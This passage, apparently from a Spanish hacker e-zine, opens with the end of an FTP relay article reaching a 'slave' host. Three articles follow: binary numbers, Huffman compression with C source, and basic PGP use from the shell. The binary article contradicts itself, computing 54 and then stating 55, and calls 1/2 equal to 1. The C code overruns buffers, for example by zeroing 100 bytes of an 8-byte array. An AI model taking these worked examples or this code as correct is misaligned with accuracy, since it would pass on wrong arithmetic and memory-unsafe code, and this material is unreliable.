Ya tenemos la comunicacion principal, ahora podemos dedicarnos a acceder al
servicio ftp.

emuladorftp 200.200.200.200 9000 201.201.201.201 21

y ahora para acceder al ftp del esclavo solo tenemos que hacer un ftp a : 
ftp 200.200.200.200 9000  
o tambien
ftp 127.0.0.1 9000

Se puede utilizar cualquier cliente de ftp y cualquier numero de sesiones....




Origen de Eid0 Espa~a 6 de Junio, 2001
Modificacion y Testeado por Toleran-C 2001 & Silen-C  el 23 de Octubre, 2001


[=========================([ Electron Security Team ])===========================]





[====([ meth0dist ])=======================================================EST-4=]
[====([ Numeros Binarios ])==================================================#13=]
[=========================================================([ meth0dist@est.cl ])=]

 
Hola, en este articulo voy  a  hablar sobre  los numeros binarios, ya que creo que
todos  deberian  conocerlos  porque  desempe~an una labor muy importante en lo que
respecta  a los computadores. Primero que  nada  tienen que saber que  los numeros 
binarios son solo dos: 0 y 1  nada  mas, olvidense  totalmente  del  3,4,5,6,7,8,9
ya que esos no  existen  aca, ni  nos sirven. Se estaran preguntando, por que solo
0 y 1, bueno  ya que estos valores sirven, como  por un  ejemplo  conocido: 0 para
apagado y 1 para prendido, o 0 para si  y 1 p ara  no, o 0 para  activado y 1 para 
desactivado, van captando todos?? 
Ahora, la pregunta del  millon!!, que  se  hace  para  transformar  de  un  numero 
decimal  a uno  binario  o viceversa. Esto  se  hace  de  una forma  muy  facil, e
inclusive  se  pueden  realizar   operaciones   matematicas, como   sumar, restar, 
multiplicar  y dividir asi que vamos preparandonos para  aprender  estos  metodos.

Vamos a lo primero, transformar de un numero decimal a uno binario.

Tenemos el numero 13 y queremos transformarlo a binario. El 13 se  divide  por 2 y 
se va guardando el numero que sobra, ya sea 0 o 1, hasta que la division sea igual
a 0 o 1. Luego se ordenan los numeros de derecha a  izquierda, veamos  un  ejemplo 
para entender mas rapido.

13/2=6                      Sobra 1
6/2=3                       Sobra 0
3/2=1                       Sobra 1
1/2=1 (se aproxima 0.5 a 1) Sobra 1

Ahora se ordena de derecha a  izquierda o aqui, de  abajo hacia arriba por lo que
obtendriamos como resultado 1101, o sea 13 en binario es 1101.
Hagamos la otra operacion un poco  mas  compleja, transformando  84 en  un numero 
binario, ok?

84/2=42  Sobra 0
42/2=21  Sobra 0
21/2=10  Sobra 1
10/2=5   Sobra 0
5/2=2    Sobra 1
2/2=1    Sobra 0
1/2=1    Sobra 1

Por lo que  obtendriamos ordenando de  derecha a izquierda o desde abajo hacia
arriba el numero: 1010100

Bueno, ahora que aprendimos a transformar un numero  normal a binario, estaran
esperando aprender a hacerlo de la manera inversa que tambien es simple y para
esto se utilizan las  potencias  de  2. Veamos, tenemos  en  binario 110110  y 
queremos  saber  que  numero es. Lo que  hacemos es partir  tomando  el primer
numero en binario de la derecha y  luego lo multiplicamos  por la potencia  de
2^0, luego con el  segundo numero  de  derecha a izquierda  lo mismo, pero  se 
multiplican por 2^1, y asi  sucesivamente (2^0, 2^1, 2^3, 2^4...), al final se
suman todos los resultados  de las multiplicaciones  obteniendo como resultado 
el numero. Veamos aca como se hace para kaptar mejor.

110110 (Lo tomamos de derecha a izquierda, o sea 011011)

(0 x 2^0) + (1 x 2^1) + (1 x 2^2) + (0 x 2^3) + (1 x 2^4) + (1 x 2^5)
   
   0      +     2     +    4      +      0    +     16    +    32
 
                             54

Por lo que  sumando nos  daria como  resultado 55, o  sea 110110 es igual a 55.
Veamos  otro ejemplo para kachar mejor. Vamos a  transformar 11011 a un  numero 
normal. Recuerden de  tomar  el  numero  en binario  de derecha a  izquierda!!!

11011

(1 x 2^0) + (1 x 2^1) + (0 x 2^2) + (1 x 2^3) + (1 x 2^4) 

   1      +     2     +     0     +     8     +     16

                      27

Espero  que hayan  entendido, es muy simple no? Vamos  ahora a las  operaciones 
matematicas que son  tambien faciles. Primero que  nada hay que tener en cuenta
lo siguiente:

0+0=0
0+1=1
1+0=1
1+1=10  (no, no es SOPROLE!)
1+1+1=11

Partamos con la suma, imaginense que tenemos 1011 y queremos  sumarlo con 1110.
Se hace la tipica tabla de suma y se va sumando uno con uno:

     
   1011   
   1110
  +____
   11001

Como pueden apreciar el resultado es 11001, se hace igual k con una suma normal
(espero que todos sepan sumar hehehe), vamos a otro ejemplo de suma:


   111
   101
  +___
   1100


Ya que sabemos sumar ahora sigamos con la resta, que es igual a una resta normal.

   110
    10
  -___
   100

Recuerden que: 

0-0=  (tengo que decirlo?)
0-1=0 (con prestamo de 1, igual que en un resta normal)
1-0=1
1-1=0

Hagamos otro ejemplo de resta para los que no entendieron, ¡si tu, pon atencion!:

  11011
    101
 -_____
  10110



 
Cachemos ahora como hacer algunas multiplicaciones. Si queremos multiplicar
111 x 100, se hace lo siguiente, sabiendo que:

0 x 0 = 0
1 x 0 = 0
0 x 1 = 0
1 x 1 = 1

Aca abajo se multiplica el 0 con 1, luego con 1, luego con 1, luego se salta un 
espacio y se multiplica el 0 con 1, luego con 1, luego con 1, luego el 1 con el 
1, luego con el 1 y luego con el 1. Despues se suman y ese es el  resultado. Es
lo mismo que una multiplicacion comun.

       111 x 100
       _________
      
       000        
      000-
     111--
   + _____
     11100

Veamos otro ejemplo:

       1010 x 1101
       ___________
    
       1010
      0000-
     1010--
    1010---
   +_______

   10000010         



Por ultimo aprendamos a dividir en binario. Como ya lo he dicho sobre las otras
operaciones, es igual que dividir normal, nada del otro mundo.

1100/10=

Queremos dividir esto, entonces como el divisor es de dos digitos, tomamos los
dos primeros numero del dividendo:

  11'00/10=1
  10
-___
   10/10=1  
   10
  -__
    00/10=0
    10
   -__
     0

Por lo que obtendriamos de resultado 110, simple, veamos otra:


  111'00/111=1
  111
 -___ 
    000/111=0
    111
   -___
      00/111=0
     111
    -___
       0 

Aca tenemos como resultado 100. Espero que hayan entendido bien y aprendido algo
nuevo. Para los que encuentren las operaciones dificiles de realizar, otra forma
de  realizarlas es transformando los numeros binarios en  decimales, luego hacer
la operacion  y transformar  de vuelta a binario. Tambien  pueden  comprobar sus
resultados con la calculadora de windows, pasando de decimal a binario.
Bueno con esto damos termino a esta explicacion acerca de los numeros  binarios,
espero que les haya servido para aprender algo nuevo, aunque esto es  simple, es
muy util para algunas cosas saber operaciones con  los numeros  binarios. Chao y 
nos vemos...


[=========================([ Electron Security Team ])===========================]




[====([ Shisei Brujo ])====================================================EST-4=]
[====([ Compresion de Datos ])===============================================#14=]
[===============================================([ shisei_brujo@latinmail.com ])=]


Navegando por la red, me encontre con este  excelente  articulo  en  el  cual, Joe
habla sobre el metodo Huffman para la Compresion  de  Datos, la  forma  en  que es
explicado el  algoritmo  para  comprimir  es  realmente  sencilla, para  lo  cual, 
cualquier persona  que  entienda  un  poco de programacion, no tendra problemas en
entenderlo. Yo como entiendo algo, me  hize el desafio de crear un programa que me
permitiera comprimir y descomprimir archivos, los  codigos  fuentes los adjunto al
final del articulo para que lo modifiquen, arreglen, lo  elimininen, etc. Entonces
para partir, aunque se que no es  lo  mas  optimo, copio  el  articulo tal como lo
encontre, ya que creo que en el  se  explica muy bien el algoritmo, mucho mejor de
lo que yo podria explicar, y luego les explico mi codigo fuente :)

Entonces copy & paste, leanlo con mucha atencion:

==============================================================================

Compresion de Datos.

No se si te pasa como a mi, me encanta saber como funcionan las cosas que uso por
eso   intento  aprender  como  trabajan. Con  este  proposito, vamos  a  ver  que
procesos utiliza una forma de las tantas  formas  de  comprimir  informacion, muy
efectiva con texto.
Recuerdo que mi primer intento de compresor  fue un metodo que consistia en tomar
de un archivo,  cadenas  de  caracteres  que  se  repetian por todo  el archivo y 
sustituirlos por  un  caracter  que  no  esta  en  el  archivo sustituyendo 3 o 4 
caracteres por 1. Claro  esta, cuando  el  archivo  es  de  texto  es  facil, los
espacios  en   blanco  abundan, pero los archivos con un formato diferente es mas
dificil de encontrar  una  cadena  adecuada  y  un  caracter  que  la  sustituya.

Todo esto sin comentar las veces que  al  descomprimir  estos  archivos  quedaban
inservibles.

Pasemos al metodo de Huffman.

Cuando comienzas  a  entender  como   aplicar   arboles   binarios,  este  metodo
lo reinventa cada estudiante,  pero  resulta   que   al   amigo   Huffman  se  le
ocurrio primero. El metodo consiste en construir un codigo  de  prefijos  optimo,
y ustedes diran que carajo es esto?. (cuanto mas  optimo  quede  este  codigo  el 
resultado de la compresion sera mejor).

Bueno comencemos
Daremos un ejemplo que mostrara el funcionamiento del proceso.
Elijo una frase cualquiera:

MI MAMA ME AMA A MI

Esta cadena de caracteres tiene 18 bytes contando los espacios en blanco.
(Simbolizaremos estos como: " ")
El primer paso debera ser tomar cada caracter y ver cuantas veces se repite
en la cadena.

En este caso : M = 6 , I = 2, A = 5, E = 2, " " = 5.

Ordenamos de menor a mayor. Si los valores se repiten es valido poner 
cualquier caracter antes.


I   E   A   " "  M

*   *   *    *   *

2   2   5    5   6


Sumo los dos mas chicos

   4
  / \
 *   *   *   *   *
 2   2   5   5   6  

Reordeno y repito el proceso
 
     9 
    / \    
   *   *  *  *
   4   5  5  6  
  / \
 *   *
 2   2


Repito el proceso.

Sumo los 2 mas chicos
     
   11 
  /  \   
 *    *   *
 5    6   9       
         / \    
        *   * 
        4   5   
       / \
      *   *
      2   2

Reordeno

Sumo los 2 mas chicos.

        20 
      /    \
     *      *
     9      11      
    / \    /  \  
   *   *  *    *
   4   5  5    6  
  / \
 *   *
 2   2

Se habran dado cuenta que se ha formado un arbol binario. 
Las hojas de este arbol son los valores de frecuencia  de  cada  caracter. 
Ahora cuando la rama va hacia la derecha coloco valor 1, a la izquierda 0. 
Quedando el valor de I llendo desde la raiz 000

I   = 000
E   = 001
A   = 01
M   = 11
" " = 10


Se ha  generado un  codigo de  prefijos optimo. El siguiente paso es con la
igualdad del codigo de prefijos transformar la frase a binario.

         Raiz                          20
      0/      \1                     /    \  
      *        *                    *      * 
   0/  \1    0/ \1                  9      11 
   *    =    =   =                 / \    /  \    
 0/ \1  A   " "  M                *   =  =    =   
 =   =                            4   5  5    6               
 I   E                           / \       
                                =   =              
                                2   2           
    
Ahora  tomando  de  ocho  estos  0  y  1  podemos  transformar  a un numero
entre 0 y 255 con un equivalente en ASCII. Como veran hemos  reducido de 18
bytes a 6 bytes.

M  I   " "  M  A  M  A  " " M  E   " " A  M  A  " " A  " " M  I
11 000 10   11 01 11 01 10  11 001 10  01 11 01 10  01 10  11 000

11000101 10111011 01100110 01110110 01101100 0
197      187      102      118      108      0

Cambiando  estos  valores  por  sus  correspondientes en ASCII, tendran el
texto comprimido de 6 bytes.

Muy bonito.

Observaciones 

Este  es  una  compresion optima  porque el arbol es optimo si  cambiamos  de 
lugar la M por  la  I en el  arbol, el  codigo   de  la  M  pasa  a  tener  3 
caracteres  entonces  la  frase  quedara  mas larga y ocupara mas de 6 bytes.
Considerando  que tambien  hay que guardar el codigo de prefijos en este caso
el resultado final sera mayor que 18  bytes, ( prueba  comprimir  un  archivo 
que   ocupe  1  byte  con   pkzip ), pero  cuando  comprimes  un  volumen  de 
informacion  mayor  esto no sucede y la compresion es muy buena.

Despedida

Espero que este articulo les agrade, y  toda esta  teoria les ense~e algo, en
el  proximo  numero  veremos  la  TAD (tipos  abstractos  de  datos)   y   su
implementacion  para  la  codificacion de este 
algoritmo.

Joe
joe_joe@i.com.uy

=================================================================================

Bueno ahora la parte que me toca a mi, el codigo :). Para empezar quiero decirles
que el codigo no esta optimizado, es decir es la version 0.001, apenas resulto lo
deje asi.
La verdad es que lo programe solo como un desafio y no para  ocuparlo, ojala  que
alguien interesado lo pueda optimizar y ocupar en algun programa.

Empesaremos con el fuente para comprimir el archivo.
Para crear el arbol binario usaremos una estructura especial

struct nodo
{
  int info, info2;
  struct nodo *izq, *der, *raiz, *link;
};

que en principio una lista enlazada de la siguiente forma:

     |           |
  [x][x] ---> [x][x] ---
  /    \      /    \    |
                        //
para luego transformarse en un arbol binario:

                                      |
                                   [x][x]
                                   /    \
                                 /        \
                               /            \
                             /                \
                            |                  |
                          [x][x] ----------> [x][x] ---> //
                          /                  /    \
                        /                  
                      /                  
               ______|____             
              |           |           
           [x][x] ---> [x][x] ---> //
           /    \      /    \     
                        
Explico, comienzo leyendo el archivo y llenando  un  vector (num[255]) con  la
cantidad de cada caracter que hay en el archivo, por ej. si hay 55 letras 'a',
entonces num[97] = 55 (97 es el codigo ASCII de 'a').
Luego lleno la "lista enlazada" con  la  funcion  "crea", en  la  cual  no  se
incluyen los caracteres que tienen cantidad cero.

Despues esta lista ya llena, es ordenada, de  menor  a  mayor. A  continuacion
se comienza a crear el arbol, sumando  los  dos  primeros nodos de la lista, y
creando un nodo raiz (para  esos  dos  nodos) con el valor de la suma, es cual
queda  apuntando  hacia  el  tercer nodo, con  el  puntero  "link". Notese que 
con esto la lista va disminuyendo en un nodo.
Se  ordena  nuevamente, y se repite el proceso de la suma, todo esto hasta que
quede solamente un nodo en la lista.
Por ej.

1) la lista:
  
  ->2->3->3->4->7->//

2) se suman los dos menores y se crea un nodo raiz con la suma

   ->5->3->4->7->//
    / \
   2  3

3) se ordenan 

  ->3->4->5->7->//
         / \
        2   3

4) se suman 

  ->7----->5->7->//
   / \    / \
  3   4  2   3

5) se ordenan

  ->5----->7->7->//
   / \    / \
  2   3  3   4

6) se suman

  ->12->7->//
   /  \
  5     7
 / \   / \
2   3 3   4

7) se ordenan

  ->7->12->//
      /  \
     5     7
    / \   / \
   2   3 3   4

8) y finalmente se suman y queda construido el arbol :)

    ->19->//
     /  \
    7   12
       /   \
      5     7
     / \   / \
    2   3 3   4

Nota: En el ejemplo solo muestro la cantidad de  caracteres  que  hay  en  el
archivo,  pero  recuerden  que  cada  nodo  hoja  lleva  ademas  el valor del
caracter en ascii, para poder ser reconocido facilmente. 

Ya creado el arbol, llenaremos el  vector  "bin", con  el  valor  binario del
recorrido que hace para llegar  a  cada caracter. Para esto, primero se busca
el caracter, luego se sube hacia  la raiz, si el nodo del caracter esta hacia
la izquierda, se le agrega un '0' al  bin[x], si  esta  hacia  la derecha, un
'1', y asi hasta llegar a la raiz del arbol. Luego este  binario  se  voltea,
ya que fue creado al revez (si no se hace, no funciona el programa).

Por  ejemplo, imaginemos que queremos ver el valor binario del recorrido para
la  letra 'X', primero hacemos el recorrido hasta llegar a la raiz del arbol,
por ej. 0001 lo volteamos, queda 1000, lo que graficamente seria

			Raiz
		           \ 1
                           Nodo
                           / 0
                       Nodo
                       / 0
                    Nodo
                    / 0
                  'X'


Finalmente se abre nuevamente  el  archivo  a  comprimir, se  lee  el  primer
caracter, el cual lleva  un  binario  adjunto, por  ej. si es 'a', el  vector
bin[97]='011101001', este se corta en los ocho  primeros caracteres, o  se le
agrega el siguiente caracter si es que faltara para  llenar  los  ocho. Luego
este   binario (de  ocho   caracteres)  se   transforma   a   decimal, y   su
representacion en el codigo ASCII se escribe en el archivo comprimido.

Continua asi con los siguientes caracteres del archivo hasta llegar al final.

Nota: Al comienzo del archivo se escribe todos  los  caracteres presentes  en
el archivo, junto con su representacion  binaria, esto  se  hace  para  luego
poder descomprimirlos. 
Nota2: El archivo comprimido tiene una extension ".cmp", lo  puedes  abrir  y
observar la estructura :)

A continuacion pego el codigo fuente del compresor.

#include <stdio.h>
#include <string.h>

#define max 256

struct nodo
{
  int info, info2;
  struct nodo *izq, *der, *raiz, *link;
};

int num[max], NumCaracteres;
char bin[max][max];
char arch[max];
struct nodo *p, *u;

void inicio()
{
  int x;
  for(x=0;x<max;x++)
  {
    num[x]=0;
    bzero(bin[x], max);
  }
}

void crea_bin(struct nodo *z, int e, int x)
{
  struct nodo *q;
  q=z;
  z=z->raiz;
  if(z!=NULL)
  {
    if(z->izq==q)
      bin[e][x]='0';
    if(z->der==q)
      bin[e][x]='1';
    crea_bin(z, e, x+1);
  }
}
struct nodo *buscar(struct nodo *z, int e)
{
  struct nodo *x;
  if(z!=NULL)
  {
    if(z->info2==e)
      return z;
    else
    {
      x=buscar(z->izq, e);
      if(x!=NULL)
        return x;
      x=buscar(z->der, e);
      if(x!=NULL)
        return x;
    }
  }
  else
    return NULL;
}
void crea()
{
  int x;
  struct nodo *q;
  for(x=0;x<max;x++)
  {
    if(num[x]!=0)
    {
      NumCaracteres++;
      q=(struct nodo*)malloc(sizeof(struct nodo));
      q->info=num[x];
      q->info2=x;
      q->link=NULL;
      q->der=NULL;
      q->izq=NULL;
      q->raiz=NULL;
      if(p==NULL)
      {
        p=q;
        u=q;
      }
      else
      {
        u->link=q;
        u=q;
      }
    }
  }
}

void ordenar()
{
  struct nodo *q, *r, *aux, *aux2;
  int x;
  for(x=0;x<max;x++)
  {
    q=p;
    while(q->link!=NULL)
    {
      r=q->link;
      if(q->info>r->info)
      {
        aux=(struct nodo*)malloc(sizeof(struct nodo));
        
        if(q->izq!=NULL)
        {
          aux2=q->izq;
          aux2->raiz=r;
          aux2=q->der;
          aux2->raiz=r;
        }
        if(r->izq!=NULL)
        {
          aux2=r->izq;
          aux2->raiz=q;
          aux2=r->der;
          aux2->raiz=q;
        }

        aux->info=q->info;
        q->info=r->info;
        r->info=aux->info;
        
        aux->izq=q->izq;
        q->izq=r->izq;
        r->izq=aux->izq;
        
        aux->der=q->der;
        q->der=r->der;
        r->der=aux->der;
        
        aux->raiz=q->raiz;
        q->raiz=r->raiz;
        r->raiz=aux->raiz;
        
        aux->info2=q->info2;
        q->info2=r->info2;
        r->info2=aux->info2;
        
      }
      q=q->link;
    }
  }
}

void crea_arbol()
{
  struct nodo *q, *r, *n;
  int x;
  q=p;
  for(x=0;x<2;x++)
  while(q->link!=NULL)
  {
    n=(struct nodo*)malloc(sizeof(struct nodo));
    ordenar();
    r=q->link;
    r->raiz=n;
    q->raiz=n;
    n->info=q->info+r->info;
    n->raiz=NULL;
    n->izq=q;
    n->der=r;
    n->link=r->link;
    p=n;
    q=p;
  }
}

void llenar_vector()
{
  FILE *archivo;
  int i, sw;
  sw=0;
  if((archivo=fopen(arch, "r"))==NULL)
  {
    printf("Error leyendo archivo %s\n", arch);
    exit(-1);
  }
  while(!feof(archivo))
  {
    i=fgetc(archivo);
    if((i>=0)&&(i<=256))
    {
      num[i]++;
      sw++;
    }
  }
  fclose(archivo);
  if(sw==0)
  {
    printf("El archivo esta vacio\n");
    exit(0);
  }
}
void comprimir()
{
  FILE *archivo, *salida;
  int i, x, j;
  char arch2[max];
  char palabra[1000], palabra2[1000], palabra3[8];
  strcpy(arch2, arch);
  strcat(arch2, ".cmp");
  if((archivo=fopen(arch, "r"))==NULL)
  {
    printf("Error leyendo archivo %s\n", arch);
    exit(-1);
  }
  if((salida=fopen(arch2, "w"))==NULL)
  {
    printf("Error abriendo archivo %s\n", arch2);
    exit(-1);
  }
  
  bzero(palabra, 1000);
  bzero(palabra2, 1000);
  
  fprintf(salida, "%d\n", NumCaracteres);
  for(j=0;j<max;j++)
  {
    if(num[j]!=0)
    {
      fprintf(salida, "%c %s\n", j, bin[j]);
    }
  }
  
  while(!feof(archivo))
  {
    i=fgetc(archivo);
    if((i>=0)&&(i<=256))
    {
      strcat(palabra, bin[i]);
      if(strlen(palabra)>7)
      {
        for(x=8;x<strlen(palabra);x++)
          palabra2[x-8]=palabra[x];
        strcpy(palabra3, palabra);
        bzero(palabra, 100);
        strcpy(palabra, palabra2);
        bzero(palabra2, 100);
        fputc(bin_num(palabra3), salida);
        bzero(palabra3, 100);
      }
    }
  }
  if(palabra[0]!=' ')
    fputc(bin_num(palabra), salida);
  fclose(archivo);
  fclose(salida);
}

int bin_num(char *pal)
{
  int x, sum;
  sum=0;
  for(x=0;x<strlen(pal);x++)
  {
    if(pal[x]=='1')
      sum=sum*2+1;
    else
      sum=sum*2;
  }
  return sum;
}
    
void voltea(int x)
{
  int i, j;
  char tmp[max];
  strcpy(tmp, bin[x]);
  j=strlen(tmp);
  bzero(bin[x], max);
  for(i=0;i<j;i++)
    bin[x][i]=tmp[j-i-1];
}
main(int argc, char *argv[])
{
  struct nodo *aux;
  int x;
  NumCaracteres=0;
  system("clear");
  if(argc!=2)
  {
    printf("Uso: %s <archivo a comprimir>\n\n", argv[0]);
    exit(0);
  }
  strcpy(arch, argv[1]);
  inicio();
  llenar_vector();
  crea();
  crea_arbol();
  for(x=0;x<max;x++)
  {
    if(num[x]!=0)
    {
      aux=buscar(p, x);
      crea_bin(aux, x, 0);
      voltea(x);
     }
  }
  comprimir();
  printf("Ok\n\n");
}

Ufff!, Ahora para descomprimir  se  crea  un  arreglo  binarios[255], en  los
cuales tiene listo el codigo binario de cada numero, por ej.
binarios[0][00000000]
binarios[1][00000001]
....
luego se abre el  archivo ".cmp", se  lee  la  cabecera, con  esto  se  llena 
un arreglo "Carac[x][x]" con los valores binarios, por ej. para  el  caracter
'A' Carac[65][1001011], luego se lee el primer caracter, con  su  valor ascii
se usa el arreglo binarios, donde esta su codigo, por ej. se lee el  caracter
'n', su valor es el 110 por lo tanto:
binarios[110][01101110]

Luego, se toma el primer numero de este  codigo, y se  busca si  uno  de  los
caracteres que estaba en la cabecera tiene ese  valor, si no es asi, se toman
los dos primeros caracteres y se busca el caracter, asi  hasta  el  final, si
no encuentra nada, se le agrega el siguiente  caracter  del  archivo, por ej.
de '01101110' se toma '0'
Se busca  en  el  arreglo 'Carac' si  es  que  hay un caracter con este valor
supongamos que no  se  encuentra  nada, entonces  sigue  con '01', supongamos
ahora que lo encuentra en  el  caracter 'z', entonces  se  escribe 'z' en  el
archivo  descomprimido, y se  sigue  con  el  resto del codigo '101110' y  se
repite el proceso.
asi se sigue sucesivamente hasta el final del archivo ".cmp", con lo  que  se
habra creado el archivo descomprimido.

Ahora pego el codigo para descomprimir.

#include <stdio.h>

#define max 256

char Caract[max][max];
char binarios[max][max];
char arch[max], arch2[max];
int NumCaracteres;
FILE *entrada, *salida;
void inicio()
{
  int x;
  for(x=0;x<max;x++)
    bzero(Caract, max);
}
int transformar(char tmp[10])
{
  int x, i, j, k;
  i=0;
  k=1;
  j=strlen(tmp)-2;
  for(x=j;x>=0;x--)
  {
    i+=(tmp[x]-48)*k;
    k*=10;
  }
  return i;
}
void leer_cabecera()
{
  int i, j, cont, x, sw;
  char tmp[20];
  bzero(tmp, 20);
  fgets(tmp, 10, entrada);
  NumCaracteres=transformar(tmp);
  for(x=0;x<NumCaracteres;x++)
  {
    bzero(tmp, 20);
    i=getc(entrada);
    j=getc(entrada);
    cont=0;
    do{
      j=getc(entrada);
      tmp[cont]=j;
      cont++;
    }while(j!=10);
    tmp[cont-1]='\x0';
    strcpy(Caract[i], tmp);
    printf("%c %s\n", i, Caract[i]); //Comenta esta linea para no ver la
  }                                  //cabecera
}

void crea_bin(char tmp[10], int x, int opc)
{
  int i, j=0;
  char aux[10];
  bzero(tmp, 10);
  for(i=0;i<8;i++)
    if(opc==0)
      tmp[i]=48;
    else
      tmp[i]=' ';
  do{
    i=x%2;
    x=x/2;
    if(i)
      tmp[7-j]='1';
    else
      tmp[7-j]='0';
    j++;
  }while(x>0);
  j=0;
  if(opc!=0)
  {
    for(i=0;i<8;i++)
      if(tmp[i]==' ')
        j++;
    for(i=j;i<8;i++)
    {
      tmp[i-j]=tmp[i];
    }
    for(i=8-j;i<8;i++)
      tmp[i]='\x0';
  }
}

void buscar(char tmp[1000])
{
  char aux[1000], aux2[1000];
  int x, i, j, k, res;
  x=0;
  while(x<strlen(tmp))
  {
    bzero(aux, 1000);
    for(i=0;i<x+1;i++)
      aux[i]=tmp[i];
    j=0;
    res=1;
    while((res!=0)&&(j<max))
    {
      if(strlen(Caract[j])!=0)
        res=strcmp(aux, Caract[j]);
      j++;
    }
    if(res==0)
    {
      fprintf(salida, "%c", j-1);
      bzero(aux2, 1000);
      for(i=0;i<strlen(tmp)-x-1;i++)
        aux2[i]=tmp[x+i+1];
      strcpy(tmp, aux2);
      x=-1;
    }
    x++;
  }
}
void descomprimir()
{
  int i, j, res;
  long x, y;
  char tmp[max], tmp2[1000];
  bzero(tmp2, 1000);
  j=0;
  x=ftell(entrada);
  fseek(entrada, 0, 2);
  y=ftell(entrada);
  fseek(entrada, x, 0);
  while(!feof(entrada))
  {
    i=getc(entrada);
    if((i>=0)&&(i<=256))
    {
      x=ftell(entrada);
      if(x!=y)
      {
        bzero(tmp, 10);
        strcat(tmp, binarios[i]);
      }
      else
      {
        crea_bin(tmp, i, 1);
        strcat(tmp2, tmp);
      }
      printf("%s\n", tmp);//comenta esta linea para no ver los binarios
      strcat(tmp2, tmp);
      buscar(tmp2);
    }
  }
}
void crea_binarios()
{
  int i;
  for(i=0;i<max;i++)
  {
    bzero(binarios[i], max);
    crea_bin(binarios[i], i, 0);
  }
}    
main(int argc, char *argv[])
{
  int x;
  if(argc!=2)
  {
    printf("Uso: %s <archivo a descomprimir>\n\n", argv[0]);
    exit(0);
  }
  strcpy(arch, argv[1]);
  for(x=0;x<strlen(arch)-4;x++)
    arch2[x]=arch[x];
  inicio();
  crea_binarios();
  if((entrada=fopen(arch, "r"))==NULL)
  {
    printf("Error leyendo archivo %s\n", arch);
    exit(-1);
  }
  if((salida=fopen(arch2, "w"))==NULL)
  {
    printf("Error abriendo archivo %s\n", arch2);
    exit(-1);
  }
  leer_cabecera();
  descomprimir();
  fclose(entrada);
  fclose(salida);
  printf("Ok\n\n");
}

Al principio  es  dificil entender todo esto, pero con dedicacion  todo  sale.
La compresion  no  es la mejor, y la descompresion en archivos  grandes es muy
lenta, asi que  no  creo que  el codigo  sirva para  comercializarlo, pero  si
sirve  para  aprender un poco  mas de  informatica  y  ver  como funcionan las
cosas.
Ademas que el codigo no esta optimizado para nada, a lo mejor algun dia podria
llegar a optimizarlo


[=========================([ Electron Security Team ])===========================]




[====([ EleKtr0 ])=========================================================EST-4=]
[====([ Manejo Basico de Pgp Desde la Bash# ])===============================#15=]
[===========================================================([ elektr0@est.cl ])=]


Cuando  hablamos de  seguridad  es  imposible no  referirnos a la  criptografia, 
muchos programas de cifrados han  pasado seguramente  por numerosas paguinas  de 
prestiguisas revista mas ninguno ha tenido el exito  que en la actualidad  se le
atribuye a PGP.

Podria dar muchas razones del por que es necesario encriptar, a muchos les puede
parece quisas un poco paranoico pero en fin, este articulo no discute este tema
de que es censillo hacerlo lo es! y prevenir un poco no le hace da~o a nadien...

Yo hablo de prevencion... pero en  realidad siendo  frios, ¿a quien le  interesa 
leer los mails que enviamos a nuestros amigos?... Nosotros como  nacion en miras
de  una  sociedad  mas  informada  de  las  actuales  tecnologias  tenemos  como 
referencias a USA por poner un ejemplo, proyectos  como  Echelon, Carnivoro  por
nombrar algunos han aumentado tremendamente la paranoia.

Entrando ya en materia  cualquier lenguaje de  programacion  es  considerado  un
metodo de cifrado, puesto que muchos adectos consideran  al lenguaje makina como 
indecifrable.

El uso principal de PGP es el cifrado de correos atraves  del  metodo de llaves, 
de este tema ya se escrito mucho, no creo que alguien entendido no haya leido el
funcionamiento de la llave publica y privada.

Este articulo pretende ayudar a usar pgp en nuestros  linux desde la consola :D,
para aquellos que les gusta todo en bandeja y facilito les advierto que se bayan 
buscando algun front-end para correrlo  desde X puesto que  de momento  prefiero 
hacerlo desde consola y este  articulo se focaliza en el uso de pgp en  consola. 
Bamos  a  usar un  unico programa  que  a su ves se  divide en 4  programas  mas 
encargados cada uno de funciones distintas de pgp:

pgp-5.0i: ftp://ftp.es.pgpi.org/pub/pgp/5.0/unix/linux/

- pgpk: Encargado de la creacion y administracion de claves.
- pgps: Encargado del firmado de mensajes.
- pgpe: Encargado del cifrado y del mensaje.
- pgpv: Encargo de verificar y desencriptar mensajes.

- En primera instancia generaremos nuestro propio par de claves:

bash# pgpk -g

Choose the type of your public key:
1)  DSS/Diffie-Hellman - New algorithm for 5.0 (default)
2)  RSA
$Choose 1 or 2:1
Pick your public/private keypair key size:
(Sizes are Diffie-Hellman/DSS; Read the user's guide for more information)
1)   768/768  bits- Commercial grade, probably not currently breakable
2)  1024/1024 bits- High commercial grade, secure for many years
3)  2048/1024 bits- "Military" grade, secure for forseeable future(default)
4)  3072/1024 bits- Archival grade, slow, highest security
Choose 1, 2, 3 or 4, or enter desired number of Diffie-Hellman bits
$(768 - 4096):2
#You need a user ID for your public key.  The desired form for this
#user ID is your FULL name, followed by your E-mail address enclosed in , if you
have an E-mail address. 
For example: Joe Smith If you violate this standard, you will lose much of the 
benefits of PGP 5.0's keyserver
and email integration.
$Enter a user ID for your public key: 
$elektr0 EST
Enter the validity period of your key in days from 0 - 999
$0 is forever (and the default):
You need a pass phrase to protect your private key(s).
Your pass phrase can be any sentence or phrase and may have many
words, spaces, punctuation, or any other printable characters.
$Enter pass phrase:
Enter again, for confirmation:
$Enter pass phrase:


 
Cuando concluye  la operacion de generacion  de llaves, el  programa  nos da  la 
opcion de conectarnos a uno  de  los  tantos  servidores  de  claves  existentes, 
pudiendo hacerce posteriormente con:

bash# pgpk -xa -o [url-del-servidor]

La primera ves que  ejecutemos  pgpk se creara en nuestro home  un subdirectorio 
llamado ./pgp en el que se lamacenan los  anillos  de claves y  otros  archivos.

PubRing = "/home/elektr0/.pgp/pubring.pkr"
SecRing = "/home/elektr0/.pgp/secring.skr"
RandSeed = "/home/elektr0/.pgp/randseed.bin"

En los anillos de claves estaran almacenados nuestra clave publica (pubring.pkr)
y privada (secring.skr), es recomendable hacer un  respaldo de  este directorio.

Bueno ya tenemos nuestro par de claves, ahora  basta que  la  gente disponga  de 
nuestra clave publica  para que nos puedan enviar  mensajes  encriptados, muchos
recurren a  publicarlas  en sus  paguinas  webs  o  bien  en los  ya mencionados 
servidores de claves.

Otra forma un  poco mas "viva" seria enviarles atraves del mismo  correo nuestra
clave publica a quienes asi lo quieran o de quienes nosotros quisieramos recibir
correos enciprtados, para extraer la clave usamos:

bash# pgpk -xa idclave -o idclave.asc

Este comando genreara  un  archivo de texto  plano  legible  con  nuestra  clave
